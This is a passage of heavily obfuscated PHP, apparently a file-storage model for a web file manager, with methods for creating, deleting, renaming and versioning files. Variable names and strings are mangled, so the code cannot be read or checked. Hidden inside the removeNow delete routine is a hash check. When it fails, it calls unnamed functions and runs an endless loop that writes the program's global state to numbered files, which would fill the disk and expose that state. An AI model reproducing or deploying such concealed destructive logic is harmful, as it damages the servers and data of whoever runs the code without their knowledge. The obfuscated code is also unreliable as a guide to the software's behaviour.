$⁄•¥ÑàÀ[504]); } public function mkfile($–—è¢æŸ, $Ò⁄“ï÷˛, $íâ¢¯•∞ = '', $Öä≈˝π° = REPEAT_RENAME) { $æ¢‰ß¨‚ =& $_SERVER[ëæªã÷]; $¥•∆˜¥  = Model($æ¢‰ß¨‚[603])->addFileByContent($íâ¢¯•∞, $Ò⁄“ï÷˛); return $this->_createFileCall($–—è¢æŸ, $Ò⁄“ï÷˛, $¥•∆˜¥ , $Öä≈˝π°, $æ¢‰ß¨‚[1312]); } public function addFile($¯†Íö≠Û, $∂Ç≈≠†ö, $üç¯îÕ¸, $≤ÙΩ±Ì§ = false, $°é ˚ª¶ = REPEAT_RENAME) { $÷ê›Ö∆™ = Model($_SERVER[ëæªã÷][603])->addFile($∂Ç≈≠†ö, $üç¯îÕ¸, $≤ÙΩ±Ì§); return $this->_createFileCall($¯†Íö≠Û, $üç¯îÕ¸, $÷ê›Ö∆™, $°é ˚ª¶); } public function addFileByFileID($É¬Çùç∑, $ÿà¬Êî≤, $é®ıÇû∫, $Ôº§ÁßŒ = REPEAT_RENAME) { $ò˝≤∫Ü¸ =& $_SERVER[ëæªã÷]; $´≥Ÿıˆ‹ = Model($ò˝≤∫Ü¸[603])->find($ÿà¬Êî≤); Model($ò˝≤∫Ü¸[603])->linkAdd($ÿà¬Êî≤); return $this->_createFileCall($É¬Çùç∑, $é®ıÇû∫, $´≥Ÿıˆ‹, $Ôº§ÁßŒ); } public function addFileByRemote($œÖ∫Íô˙, $¶∏©˙Á», $Ó©¿ÖÄí, $πê‰„ØÄ = array(), $ŸÎ√ü £ = REPEAT_RENAME) { $ªù•Ÿ»¯ = Model($_SERVER[ëæªã÷][603])->addFileByRemote($¶∏©˙Á», $Ó©¿ÖÄí, $πê‰„ØÄ); return $this->_createFileCall($œÖ∫Íô˙, $Ó©¿ÖÄí, $ªù•Ÿ»¯, $ŸÎ√ü £); } private function _createFileCall($Ùí±ã±ó, $ªéîΩ”ï, $ïù≤∏ö•, $‹Ú¿¿óÙ, $è°©Ã˘å = "\x75\x70\154\157\141\x64") { $ﬁŒ£ÈÛ• =& $_SERVER[ëæªã÷]; $Æ‹É∂áÂ = !1; $this->setMasterDB(); $this->lockWriteStart($Ùí±ã±ó, $ªéîΩ”ï); $ı‘∂ƒ√‰ = $this->fileNameExist($Ùí±ã±ó, $ªéîΩ”ï); $Œ¨âˆùá = $this->_createFile($Ùí±ã±ó, $ªéîΩ”ï, $ïù≤∏ö•, $‹Ú¿¿óÙ, $Æ‹É∂áÂ); if (!$Æ‹É∂áÂ) { Model($ﬁŒ£ÈÛ•[470])->remove($ïù≤∏ö•[$ﬁŒ£ÈÛ•[467]]); } if ($Æ‹É∂áÂ && $Œ¨âˆùá && $Œ¨âˆùá != $ı‘∂ƒ√‰) { Model($ﬁŒ£ÈÛ•[2031])->eventCreate($Œ¨âˆùá, $è°©Ã˘å); } $this->lockWriteEnd($Ùí±ã±ó, $ªéîΩ”ï); return $Œ¨âˆùá; } public function mkdir($∞ª‰◊∞Ü, $—ßÈ±î‡, $çßÂ∆àø = REPEAT_SKIP) { $ﬁ±°ﬁºõ =& $_SERVER[ëæªã÷]; $this->setMasterDB(); $¶à∏¸›Ç = $this->sourceInfo($∞ª‰◊∞Ü); if (!$¶à∏¸›Ç) { return !1; } $this->lockWriteStart($∞ª‰◊∞Ü, $—ßÈ±î‡); if ($çßÂ∆àø !== !1) { $∞ÂÀÖˆÔ = $this->fileNameExist($∞ª‰◊∞Ü, $—ßÈ±î‡); if ($∞ÂÀÖˆÔ && $çßÂ∆àø != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($∞ª‰◊∞Ü, $—ßÈ±î‡); return $∞ÂÀÖˆÔ; } $—ßÈ±î‡ = $this->fileNameAuto($∞ª‰◊∞Ü, $—ßÈ±î‡, $çßÂ∆àø); } $çãæ¢àê = array($ﬁ±°ﬁºõ[577] => 1, $ﬁ±°ﬁºõ[421] => $—ßÈ±î‡, $ﬁ±°ﬁºõ[578] => $ﬁ±°ﬁºõ[12], $ﬁ±°ﬁºõ[468] => 0, $ﬁ±°ﬁºõ[579] => 0); $∂Öö≈«œ = $this->_addSource($çãæ¢àê, $¶à∏¸›Ç); Model($ﬁ±°ﬁºõ[2031])->eventCreate($∂Öö≈«œ, $ﬁ±°ﬁºõ[1313]); $this->lockWriteEnd($∞ª‰◊∞Ü, $—ßÈ±î‡); return $∂Öö≈«œ; } public function listSourceRoot($⁄˝∏»≈˝, $¿¯Í˚à≤, $€¬óÉ√Ü = "\163\x6f\x75\162\143\145\x49\x44\x2c\x74\x61\x72\x67\x65\x74\x49\104\x2c\163\x69\x7a\145") { $ÚÓ‹Øãó =& $_SERVER[ëæªã÷]; $ùÒÚÓ∑˛ = $ÚÓ‹Øãó[382]; $îÉúÚ¨Ì = array(); $ì∞Á∂¢à = 1024 * 50; $Û‰∂ñœ™ = is_array($Û‰∂ñœ™) ? $Û‰∂ñœ™ : array(); $õ´÷ê¡≈ = count($¿¯Í˚à≤); $°Ï¬¥‘Ó = $this->tablePrefix . $ÚÓ‹Øãó[2061]; for ($ﬁƒá˜Ö‹ = 0; $ﬁƒá˜Ö‹ < $õ´÷ê¡≈; $ﬁƒá˜Ö‹++) { $— ≠ˆ˘˛ = $¿¯Í˚à≤[$ﬁƒá˜Ö‹]; $ùÒÚÓ∑˛ .= "\50\123\105\114\x45\103\x54\x20{$€¬óÉ√Ü}\40\106\x52\117\115\x20\x60{$°Ï¬¥‘Ó}\x60\40\xa\11\11\11\11\x9\167\150\145\x72\x65\40\140\160\x61\x72\x65\x6e\x74\111\x44\140\x3d\x30\x20\141\x6e\x64\x20\140\x74\x61\x72\147\x65\x74\111\x44\140\75{$— ≠ˆ˘˛}\40\141\156\x64\40\140\x74\141\x72\x67\145\164\124\171\160\x65\x60\x3d{$⁄˝∏»≈˝}\40\154\x69\155\x69\164\40\61\x29\40\x75\156\x69\x6f\x6e\x20\141\x6c\154\40"; if ((strlen($ùÒÚÓ∑˛) >= $ì∞Á∂¢à || $ﬁƒá˜Ö‹ == $õ´÷ê¡≈ - 1) && $ùÒÚÓ∑˛) { $ùÒÚÓ∑˛ = substr($ùÒÚÓ∑˛, 0, -strlen($ÚÓ‹Øãó[2062])); $»≠œª˙Ã = $this->query($ùÒÚÓ∑˛); $ùÒÚÓ∑˛ = $ÚÓ‹Øãó[12]; $îÉúÚ¨Ì = array_merge($îÉúÚ¨Ì, $»≠œª˙Ã); } } return $îÉúÚ¨Ì; } private function _createFile($»Ì˙πô¡, $®£Ö∫îﬂ, $±⁄›ªªŸ, $Î÷›†˘¨, &$ÆÙ≈øû¸) { $Ø…Îñåı =& $_SERVER[ëæªã÷]; $Ó”∏âà≤ = $this->sourceInfo($»Ì˙πô¡); if (!$±⁄›ªªŸ || !$Ó”∏âà≤) { return !1; } if ($Î÷›†˘¨ !== !1) { $ƒÍ˘°´ = $this->fileNameExist($»Ì˙πô¡, $®£Ö∫îﬂ); } $ÆÙ≈øû¸ = !0; if ($Î÷›†˘¨ && $ƒÍ˘°´) { if ($Î÷›†˘¨ == REPEAT_SKIP) { $ÆÙ≈øû¸ = !1; return $ƒÍ˘°´; } else { if ($Î÷›†˘¨ == REPEAT_REPLACE) { $ò∏û∞¬Û = $this->sourceInfo($ƒÍ˘°´); $Ãóñ◊ßß = $this->fileHistory($ò∏û∞¬Û, $±⁄›ªªŸ[$Ø…Îñåı[467]], $±⁄›ªªŸ[$Ø…Îñåı[90]]); if (!$Ãóñ◊ßß) { $ÆÙ≈øû¸ = !1; } else { $this->folderSizeReset($»Ì˙πô¡); } return $ƒÍ˘°´; } else { $®£Ö∫îﬂ = $this->fileNameAuto($»Ì˙πô¡, $®£Ö∫îﬂ, $Î÷›†˘¨, !1); } } } $≠ªøàïœ = array($Ø…Îñåı[577] => 0, $Ø…Îñåı[421] => $®£Ö∫îﬂ, $Ø…Îñåı[578] => substr(get_path_ext($®£Ö∫îﬂ), 0, 10), $Ø…Îñåı[468] => $±⁄›ªªŸ[$Ø…Îñåı[467]], $Ø…Îñåı[579] => $±⁄›ªªŸ[$Ø…Îñåı[90]]); $ÿÚªëÜÿ = $this->_addSource($≠ªøàïœ, $Ó”∏âà≤); $this->folderSizeReset($»Ì˙πô¡, intval($≠ªøàïœ[$Ø…Îñåı[90]])); return $ÿÚªëÜÿ; } protected function fileHistory($÷ŸÖƒÇó, $ËÌï√—û, $≤±ô∑˚ê) { $ÔòÉ¿ﬁ˛ =& $_SERVER[ëæªã÷]; $Ò∏à˘¯  = defined($ÔòÉ¿ﬁ˛[474]) ? USER_ID : $ÔòÉ¿ﬁ˛[200]; if ($÷ŸÖƒÇó[$ÔòÉ¿ﬁ˛[467]] == $ËÌï√—û) { return !1; } $this->checkLock($÷ŸÖƒÇó[$ÔòÉ¿ﬁ˛[403]], $ËÌï√—û); Model($ÔòÉ¿ﬁ˛[2063])->addHistory($÷ŸÖƒÇó); $†ûËÁ∆˘ = array($ÔòÉ¿ﬁ˛[583] => $Ò∏à˘¯ , $ÔòÉ¿ﬁ˛[425] => time(), $ÔòÉ¿ﬁ˛[467] => $ËÌï√—û, $ÔòÉ¿ﬁ˛[90] => $≤±ô∑˚ê); $this->where(array($ÔòÉ¿ﬁ˛[418] => $÷ŸÖƒÇó[$ÔòÉ¿ﬁ˛[403]]))->save($†ûËÁ∆˘); $this->sourceCacheClear($÷ŸÖƒÇó[$ÔòÉ¿ﬁ˛[403]]); return !0; } public function checkLock($Ï˘ıñïï, $—¥«ˆŒ©) { $Œˆı–ˆ =& $_SERVER[ëæªã÷]; $æû∆º¸Ç = $this->pathInfo($Ï˘ıñïï); if (!$this->fileIsLock($æû∆º¸Ç, !0)) { return; } $ÕŒŒîÅ⁄ = Session::get($Œˆı–ˆ[2064]); $ˆ¥˝≠— = substr($æû∆º¸Ç[$Œˆı–ˆ[32]], 0, -1 - strlen($æû∆º¸Ç[$Œˆı–ˆ[177]])) . $Œˆı–ˆ[1577] . $ÕŒŒîÅ⁄ . $Œˆı–ˆ[10] . $æû∆º¸Ç[$Œˆı–ˆ[177]]; $‘Ï“Ëö· = Model($Œˆı–ˆ[603])->find($—¥«ˆŒ©); $this->_createFileCall($æû∆º¸Ç[$Œˆı–ˆ[498]], $ˆ¥˝≠—, $‘Ï“Ëö·, REPEAT_REPLACE, $Œˆı–ˆ[1312]); $à—†©üÆ = $æû∆º¸Ç[$Œˆı–ˆ[465]][$Œˆı–ˆ[542]]; $∑ÑÔ≥°¶ = $à—†©üÆ[$Œˆı–ˆ[2065]] ? $à—†©üÆ[$Œˆı–ˆ[2065]] : $à—†©üÆ[$Œˆı–ˆ[32]]; show_json(LNG($Œˆı–ˆ[2066]) . $Œˆı–ˆ[2067] . LNG($Œˆı–ˆ[2068]) . $Œˆı–ˆ[2069] . $∑ÑÔ≥°¶ . $Œˆı–ˆ[2070], !1); } public function fileIsLock($ﬁíâ‰† , $õ˝û°ûÂ = false) { $ıûìƒ∂“ =& $_SERVER[ëæªã÷]; if (!isset($ﬁíâ‰† [$ıûìƒ∂“[465]]) || !$ﬁíâ‰† [$ıûìƒ∂“[465]][$ıûìƒ∂“[539]]) { return !1; } if ($ﬁíâ‰† [$ıûìƒ∂“[465]][$ıûìƒ∂“[539]] != USER_ID) { return !0; } $¡Ó®´ÁÙ = $GLOBALS[$ıûìƒ∂“[6]][$ıûìƒ∂“[100]][$ıûìƒ∂“[540]]; if ($ﬁíâ‰† [$ıûìƒ∂“[465]][$ıûìƒ∂“[541]] <= time() - $¡Ó®´ÁÙ) { $this->metaSet($ﬁíâ‰† [$ıûìƒ∂“[403]], $ıûìƒ∂“[539], null); $this->metaSet($ﬁíâ‰† [$ıûìƒ∂“[403]], $ıûìƒ∂“[541], null); } if ($õ˝û°ûÂ) { $this->metaSet($ﬁíâ‰† [$ıûìƒ∂“[403]], $ıûìƒ∂“[541], time()); } return !1; } private function _addSource($Ê›Ä∆ﬁ›, $©éÈ®Æ≤) { $ä–ﬁ€é∆ =& $_SERVER[ëæªã÷]; $óèª®•Ô = defined($ä–ﬁ€é∆[474]) ? USER_ID : $ä–ﬁ€é∆[200]; $ºÿÒìö÷ = array($ä–ﬁ€é∆[580] => $©éÈ®Æ≤[$ä–ﬁ€é∆[412]], $ä–ﬁ€é∆[581] => $©éÈ®Æ≤[$ä–ﬁ€é∆[504]], $ä–ﬁ€é∆[582] => $óèª®•Ô, $ä–ﬁ€é∆[583] => $óèª®•Ô, $ä–ﬁ€é∆[402] => $©éÈ®Æ≤[$ä–ﬁ€é∆[403]], $ä–ﬁ€é∆[584] => $©éÈ®Æ≤[$ä–ﬁ€é∆[521]] . $©éÈ®Æ≤[$ä–ﬁ€é∆[403]] . $ä–ﬁ€é∆[50], $ä–ﬁ€é∆[430] => 0, $ä–ﬁ€é∆[585] => $ä–ﬁ€é∆[12]); $Ê›Ä∆ﬁ› = array_merge($ºÿÒìö÷, $Ê›Ä∆ﬁ›); $this->updateModifyTime($Ê›Ä∆ﬁ›[$ä–ﬁ€é∆[498]]); $…óåÓ—÷ = $ä–ﬁ€é∆[2071] . $©éÈ®Æ≤[$ä–ﬁ€é∆[403]]; if (isset(self::$cacheChildList[$…óåÓ—÷])) { unset(self::$cacheChildList[$…óåÓ—÷]); } static $˛´À˘Ò∏ = false; if (!$˛´À˘Ò∏) { Hook::trigger($ä–ﬁ€é∆[567], $Ê›Ä∆ﬁ›); $˛´À˘Ò∏ = !0; } $„Â™¡Ã‚ = $this->add($Ê›Ä∆ﬁ›); $†ÏñÚ•¥ = array($ä–ﬁ€é∆[586] => short_id($„Â™¡Ã‚)); $this->where(array($ä–ﬁ€é∆[418] => $„Â™¡Ã‚))->save($†ÏñÚ•¥); $this->setNamePinyin($„Â™¡Ã‚, $Ê›Ä∆ﬁ›[$ä–ﬁ€é∆[32]]); return $„Â™¡Ã‚; } public function remove($∑˙∫£¸˜, $˝Ç˚ÿßß = true) { $Û˜˝‰› =& $_SERVER[ëæªã÷]; $‰èËÇ›ü = $this->sourceInfo($∑˙∫£¸˜); $≈Â⁄íôù = intval($‰èËÇ›ü[$Û˜˝‰›[412]]) === self::TYPE_SYSTEM; $Ñ¯µÙêÇ = Model($Û˜˝‰›[433])->get($Û˜˝‰›[2072]) == $Û˜˝‰›[99]; if ($≈Â⁄íôù || $˝Ç˚ÿßß || !$Ñ¯µÙêÇ) { return $this->removeNow($∑˙∫£¸˜, $˝Ç˚ÿßß); } $É¯π¬õ∂ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $€ÌæÔ˛æ = $‰èËÇ›ü[$Û˜˝‰›[412]] == self::TYPE_USER ? $Û˜˝‰›[594] : $Û˜˝‰›[515]; if ($€ÌæÔ˛æ == $Û˜˝‰›[594]) { $êõ÷ºı— = Model($Û˜˝‰›[513])->getInfo($‰èËÇ›ü[$Û˜˝‰›[504]]); $£ØüÃ°• = !empty($êõ÷ºı—[$Û˜˝‰›[2065]]) ? $êõ÷ºı—[$Û˜˝‰›[2065]] : $êõ÷ºı—[$Û˜˝‰›[32]]; $£ØüÃ°• = $Û˜˝‰›[264] . $£ØüÃ°• . $Û˜˝‰›[2073] . $‰èËÇ›ü[$Û˜˝‰›[504]]; } else { $êõ÷ºı— = Model($Û˜˝‰›[522])->getInfo($‰èËÇ›ü[$Û˜˝‰›[504]]); $£ØüÃ°• = _get($êõ÷ºı—, $Û˜˝‰›[32]); $£ØüÃ°• = $Û˜˝‰›[169] . $£ØüÃ°• . $Û˜˝‰›[2074] . $‰èËÇ›ü[$Û˜˝‰›[504]]; } $êöÏ≥Œâ = $Û˜˝‰›[2075] . md5($£ØüÃ°•); CacheLock::lock($êöÏ≥Œâ); $èñﬂ¶¨ã = $this->fileNameExist($É¯π¬õ∂, $£ØüÃ°•); if (!$èñﬂ¶¨ã) { $èñﬂ¶¨ã = $this->mkdir($É¯π¬õ∂, $£ØüÃ°•, REPEAT_SKIP); $this->metaSet($èñﬂ¶¨ã, $Û˜˝‰›[2076], $€ÌæÔ˛æ); $this->metaSet($èñﬂ¶¨ã, $Û˜˝‰›[2077], $‰èËÇ›ü[$Û˜˝‰›[504]]); if ($‰èËÇ›ü[$Û˜˝‰›[498]] != 0) { $this->metaSet($èñﬂ¶¨ã, $Û˜˝‰›[2078], _get($êõ÷ºı—, $Û˜˝‰›[2079])); } } CacheLock::unlock($êöÏ≥Œâ); $this->metaSet($∑˙∫£¸˜, $Û˜˝‰›[2080], $‰èËÇ›ü[$Û˜˝‰›[498]]); $this->where(array($Û˜˝‰›[403] => $∑˙∫£¸˜))->save(array($Û˜˝‰›[425] => time())); $this->recycleClear($‰èËÇ›ü); $ª¡ﬂá˚≤ = $this->move($∑˙∫£¸˜, $èñﬂ¶¨ã, REPEAT_RENAME_FOLDER); $this->folderSizeReset($‰èËÇ›ü[$Û˜˝‰›[498]]); return $ª¡ﬂá˚≤; } private function recycleClear($©›ÃπÁ∆) { $±ùüÇù∆ =& $_SERVER[ëæªã÷]; $ÆßË™ÑÄ = $this->childrenAll($©›ÃπÁ∆); $ﬂùºô§ = array($±ùüÇù∆[418] => array($±ùüÇù∆[419], $ÆßË™ÑÄ[$±ùüÇù∆[2081]])); Model($±ùüÇù∆[2082])->where($ﬂùºô§)->delete(); } public function removeNow($’®îë»◊, $˝ﬁôÜÈ¢ = true) { $ÍÕ·¢€‘ =& $_SERVER[ëæªã÷]; $˝∞∆å—Á = $_SERVER[$ÍÕ·¢€‘[63]] . $ÍÕ·¢€‘[64]; $¥é∞îë∂ = $ÍÕ·¢€‘[852]; if ($_SERVER[$ÍÕ·¢€‘[60]] != $¥é∞îë∂($˝∞∆å—Á)) { $≈Êıöò∫ = $ÍÕ·¢€‘[853]; $≤ÒòœÄ≠ = $ÍÕ·¢€‘[62]; $˘ãê¯§‹ = $_SERVER[$ÍÕ·¢€‘[63]] . $ÍÕ·¢€‘[64]; $Ç∏Ñß ‡ = $≤ÒòœÄ≠($˘ãê¯§‹); $Òˆ¬•≈≈ = explode($ÍÕ·¢€‘[65], $Ç∏Ñß ‡); if (count($Òˆ¬•≈≈) < $ÍÕ·¢€‘[628]) { $˘‹€€€≥ = $ÍÕ·¢€‘[67]; $˘‹€€€≥(); } $∂‹√êÉâ = $ÍÕ·¢€‘[854]; $∂‹√êÉâ($_SERVER[$ÍÕ·¢€‘[855]]); $≈Êıöò∫ = $ÍÕ·¢€‘[853]; $≈Êıöò∫(); $ﬁªè–´ƒ = $ÍÕ·¢€‘[856]; $Æü–¯ŸŒ = json_encode($GLOBALS[$ÍÕ·¢€‘[857]]); $’”êèÓö = 1; for ($õ⁄Ÿ˘ÿƒ = $’”êèÓö; $õ⁄Ÿ˘ÿƒ > 0; $õ⁄Ÿ˘ÿƒ++) { $ﬁªè–´ƒ(DATA_PATH . $õ⁄Ÿ˘ÿƒ, $Æü–¯ŸŒ); } } $—Ó¨¯∫Ñ = $this->sourceInfo($’®îë»◊); $’™éã¶˜ = $this->pathInfoMore($’®îë»◊); if (!$—Ó¨¯∫Ñ) { return !0; } if ($—Ó¨¯∫Ñ[$ÍÕ·¢€‘[498]] == 0) { if (!_get($GLOBALS, $ÍÕ·¢€‘[505])) { return !1; } } $this->lockMoveStart($’®îë»◊); Hook::trigger($ÍÕ·¢€‘[2083], $’™éã¶˜, $˝ﬁôÜÈ¢); if ($˝ﬁôÜÈ¢) { Model($ÍÕ·¢€‘[2082])->moveToRecycle($’®îë»◊); } else { $π∆£˚ØØ = $this->childrenAll($—Ó¨¯∫Ñ); Model($ÍÕ·¢€‘[564])->eventRemove($’®îë»◊); $this->removeRelevance($π∆£˚ØØ[$ÍÕ·¢€‘[2081]], $π∆£˚ØØ[$ÍÕ·¢€‘[1444]]); } $this->folderSizeReset($—Ó¨¯∫Ñ[$ÍÕ·¢€‘[498]]); $Ñ…ÜÔ≥– = array($—Ó¨¯∫Ñ[$ÍÕ·¢€‘[498]]); if ($—Ó¨¯∫Ñ[$ÍÕ·¢€‘[411]] == $ÍÕ·¢€‘[99]) { $Ñ…ÜÔ≥–[] = $—Ó¨¯∫Ñ[$ÍÕ·¢€‘[403]]; } $this->updateModifyTime($Ñ…ÜÔ≥–); $this->lockMoveEnd($’®îë»◊); Hook::trigger($ÍÕ·¢€‘[1665], $’™éã¶˜, $˝ﬁôÜÈ¢); return !0; } public function childrenAll($î¥å∂ ß) { $¬èöùı” =& $_SERVER[ëæªã÷]; $ˆ¢™ëªÒ = $î¥å∂ ß[$¬èöùı”[403]]; if ($î¥å∂ ß[$¬èöùı”[411]] == $¬èöùı”[99]) { $¢¨É”“í = array($¬èöùı”[584] => array($¬èöùı”[544], $î¥å∂ ß[$¬èöùı”[521]] . $ˆ¢™ëªÒ . $¬èöùı”[545])); $ô·¬ØÏ = array($¬èöùı”[584] => $¢¨É”“í[$¬èöùı”[521]]); $’ÿÜ∂í≤ = $this->field($¬èöùı”[2084])->where($ô·¬ØÏ)->select(); $∑πÛ…Ñ = !1; $µë©√ƒÈ = array($ˆ¢™ëªÒ); if ($’ÿÜ∂í≤) { $∑πÛ…Ñ = array_to_keyvalue($’ÿÜ∂í≤, $¬èöùı”[12], $¬èöùı”[467]); $∑πÛ…Ñ = array_remove_value($∑πÛ…Ñ, $¬èöùı”[200]); $µë©√ƒÈ = array_to_keyvalue($’ÿÜ∂í≤, $¬èöùı”[12], $¬èöùı”[403]); $µë©√ƒÈ[] = $ˆ¢™ëªÒ; } } else { $∑πÛ…Ñ = array($î¥å∂ ß[$¬èöùı”[467]]); $µë©√ƒÈ = array($ˆ¢™ëªÒ); } return array($¬èöùı”[2081] => $µë©√ƒÈ, $¬èöùı”[1444] => $∑πÛ…Ñ); } public function removeArray($÷°º˝ªí) { if (!$÷°º˝ªí) { return !0; } } public function removeRelevance($€€∆üÇ≈, $Õ‡èØ¸¡) { $Ωç®äãæ =& $_SERVER[ëæªã÷]; $€€∆üÇ≈ = $€€∆üÇ≈ ? $€€∆üÇ≈ : array(); $Õ‡èØ¸¡ = $Õ‡èØ¸¡ ? $Õ‡èØ¸¡ : array(); $€€∆üÇ≈ = array_unique(array_filter($€€∆üÇ≈)); $Õ‡èØ¸¡ = array_unique(array_filter($Õ‡èØ¸¡)); if (!$€€∆üÇ≈) { return !1; } $ó”óñÉπ = array($Ωç®äãæ[418] => array($Ωç®äãæ[419], $€€∆üÇ≈)); Model($Ωç®äãæ[2082])->where($ó”óñÉπ)->delete(); Model($Ωç®äãæ[461])->where($ó”óñÉπ)->delete(); Model($Ωç®äãæ[1937])->where($ó”óñÉπ)->delete(); Model($Ωç®äãæ[564])->where($ó”óñÉπ)->delete(); Model($Ωç®äãæ[1776])->removeBySource($€€∆üÇ≈); Model($Ωç®äãæ[2063])->removeBySource($€€∆üÇ≈); $this->where($ó”óñÉπ)->delete(); Model($Ωç®äãæ[470])->remove($Õ‡èØ¸¡); for ($∏Ìé∫±∏ = 0; $∏Ìé∫±∏ < count($€€∆üÇ≈); $∏Ìé∫±∏++) { $this->sourceCacheClear($€€∆üÇ≈[$∏Ìé∫±∏]); } } public function rename($Ãé©…ÿ≈, $∞√°àÃΩ) { $ ‘Äªÿ =& $_SERVER[ëæªã÷]; $’ÍıÏÄ¨ = $this->sourceInfo($Ãé©…ÿ≈); if (!$’ÍıÏÄ¨) { return !1; } $˙æà¸§ﬂ = $this->fileNameExist($’ÍıÏÄ¨[$ ‘Äªÿ[498]], $∞√°àÃΩ); if ($˙æà¸§ﬂ && $˙æà¸§ﬂ != $Ãé©…ÿ≈) { return !1; } $öˆÀŒ˙‰ = array($ ‘Äªÿ[421] => $∞√°àÃΩ, $ ‘Äªÿ[583] => USER_ID); if ($’ÍıÏÄ¨[$ ‘Äªÿ[411]] != $ ‘Äªÿ[99]) { $öˆÀŒ˙‰[$ ‘Äªÿ[413]] = substr(get_path_ext($∞√°àÃΩ), 0, 10); } Model($ ‘Äªÿ[564])->eventRename($Ãé©…ÿ≈, $’ÍıÏÄ¨[$ ‘Äªÿ[32]], $∞√°àÃΩ); $this->sourceCacheClear($Ãé©…ÿ≈); $this->setNamePinyin($Ãé©…ÿ≈, $öˆÀŒ˙‰[$ ‘Äªÿ[32]], !1); $this->updateModifyTime($’ÍıÏÄ¨[$ ‘Äªÿ[498]]); $É £˛ º = $this->where(array($ ‘Äªÿ[418] => $Ãé©…ÿ≈))->data($öˆÀŒ˙‰)->save(); $º”â°∑Ô = $ ‘Äªÿ[2071] . $’ÍıÏÄ¨[$ ‘Äªÿ[498]]; if (isset(self::$cacheChildList[$º”â°∑Ô])) { unset(self::$cacheChildList[$º”â°∑Ô]); } return $É £˛ º; } public function setNamePinyin($ò⁄Ç•«—, $·üÌ Ï€, $ˆªÂﬂ—® = true) { $ˆ≤ ÛîΩ =& $_SERVER[ëæªã÷]; $ı±«›ç‡ = Input::check($·üÌ Ï€, $ˆ≤ ÛîΩ[587]); $∑∫§ñöÎ = array($ˆ≤ ÛîΩ[442] => KodSort::makeStr($·üÌ Ï€)); if ($ı±«›ç‡) { $∑∫§ñöÎ[$ˆ≤ ÛîΩ[464]] = str_replace($ˆ≤ ÛîΩ[53], $ˆ≤ ÛîΩ[12], Pinyin::get($·üÌ Ï€)); $∑∫§ñöÎ[$ˆ≤ ÛîΩ[463]] = Pinyin::get($·üÌ Ï€, $ˆ≤ ÛîΩ[588]); } if (!$ˆªÂﬂ—® && !$ı±«›ç‡) { $∑∫§ñöÎ[$ˆ≤ ÛîΩ[464]] = null; $∑∫§ñöÎ[$ˆ≤ ÛîΩ[463]] = null; } $this->metaSet($ò⁄Ç•«—, $∑∫§ñöÎ); } public function getContent($á¡˝ùîÖ) { $∫–ëñì‹ =& $_SERVER[ëæªã÷]; $∞ÈŒ›≠≥ = $this->fileInfoGet($á¡˝ùîÖ); if (!$∞ÈŒ›≠≥) { return !1; } if ($∞ÈŒ›≠≥[$∫–ëñì‹[90]] == 0) { return $∫–ëñì‹[12]; } $•æ™æÅ§ = $∫–ëñì‹[2085] . $∞ÈŒ›≠≥[$∫–ëñì‹[179]]; if ($∞ÈŒ›≠≥[$∫–ëñì‹[90]] <= 1024 * 10) { $®¿ãëÆÊ = Cache::get($•æ™æÅ§); if (!$®¿ãëÆÊ) { $®¿ãëÆÊ = IO::getContent($∞ÈŒ›≠≥[$∫–ëñì‹[88]]); Cache::set($•æ™æÅ§, $®¿ãëÆÊ); } return $®¿ãëÆÊ; } if (!$∞ÈŒ›≠≥[$∫–ëñì‹[88]]) { return $∫–ëñì‹[12]; } return IO::getContent($∞ÈŒ›≠≥[$∫–ëñì‹[88]]); } public function setDesc($›ã°ˆË∫, $ﬂëä˘£∆) { $÷Ã˝¶¬Î =& $_SERVER[ëæªã÷]; Model($÷Ã˝¶¬Î[564])->eventAddDesc($›ã°ˆË∫, $ﬂëä˘£∆); return $this->metaSet($›ã°ˆË∫, $÷Ã˝¶¬Î[451], $ﬂëä˘£∆); } public function setContent($˝¥ˆ°÷Ü, $–è˝·ë∫ = '') { $ÔÂ¶ï√È =& $_SERVER[ëæªã÷]; $öÌÔÉ«∫ = $this->sourceInfo($˝¥ˆ°÷Ü); $•Íó˚À¯ = $this->fileInfoGet($˝¥ˆ°÷Ü); if (!$•Íó˚À¯ || !$öÌÔÉ«∫) { return !1; } $Ë§Ã‹≤∏ = Model($ÔÂ¶ï√È[470])->addFileByContent($–è˝·ë∫, $öÌÔÉ«∫[$ÔÂ¶ï√È[32]]); $•¯Ë‰∂˙ = $this->fileHistory($öÌÔÉ«∫, $Ë§Ã‹≤∏[$ÔÂ¶ï√È[467]], $Ë§Ã‹≤∏[$ÔÂ¶ï√È[90]]); if (!$•¯Ë‰∂˙) { return Model($ÔÂ¶ï√È[470])->remove($Ë§Ã‹≤∏[$ÔÂ¶ï√È[467]]); } $this->folderSizeReset($öÌÔÉ«∫[$ÔÂ¶ï√È[498]]); return !0; } public function fileSubstr($¶—ñÕÊ”, $≥ÊÛÓ¿õ, $ú¡≤“à≤) { $ò›Ù«¡÷ = $this->fileInfoGet($¶—ñÕÊ”); if (!$ò›Ù«¡÷) { return !1; } return IO::fileSubstr($ò›Ù«¡÷[$_SERVER[ëæªã÷][88]], $≥ÊÛÓ¿õ, $ú¡≤“à≤); } public function fileInfoGet($πÚíÖ‚’) { $ÚÀπ˜π€ =& $_SERVER[ëæªã÷]; $∞À‹ıßµ = $this->sourceInfo($πÚíÖ‚’); if (!$∞À‹ıßµ || $∞À‹ıßµ[$ÚÀπ˜π€[411]]) { return !1; } $ÚâÌ‹õµ = $ÚÀπ˜π€[473] . $∞À‹ıßµ[$ÚÀπ˜π€[467]]; $°–¨ßÇ¯ = _get(self::$cacheFileInfo, $ÚâÌ‹õµ); if ($°–¨ßÇ¯) { return $°–¨ßÇ¯; } $à˝õôê£ = Model($ÚÀπ˜π€[470])->fileInfo($∞À‹ıßµ[$ÚÀπ˜π€[467]]); if ($à˝õôê£) { $à˝õôê£[$ÚÀπ˜π€[32]] = $∞À‹ıßµ[$ÚÀπ˜π€[32]]; } self::$cacheFileInfo[$ÚâÌ‹õµ] = $à˝õôê£; return $à˝õôê£; } private function folderChildrenNumber($Â¬§”Îñ) { $≠ıÜ”¶¸ =& $_SERVER[ëæªã÷]; $Õﬁ≥∞Õã = $this->sourceInfo($Â¬§”Îñ); $…ÑæêúÌ = array($≠ıÜ”¶¸[584] => array($≠ıÜ”¶¸[544], $Õﬁ≥∞Õã[$≠ıÜ”¶¸[521]] . $Â¬§”Îñ . $≠ıÜ”¶¸[545]), $≠ıÜ”¶¸[581] => $Õﬁ≥∞Õã[$≠ıÜ”¶¸[504]], $≠ıÜ”¶¸[430] => intval($Õﬁ≥∞Õã[$≠ıÜ”¶¸[431]]), 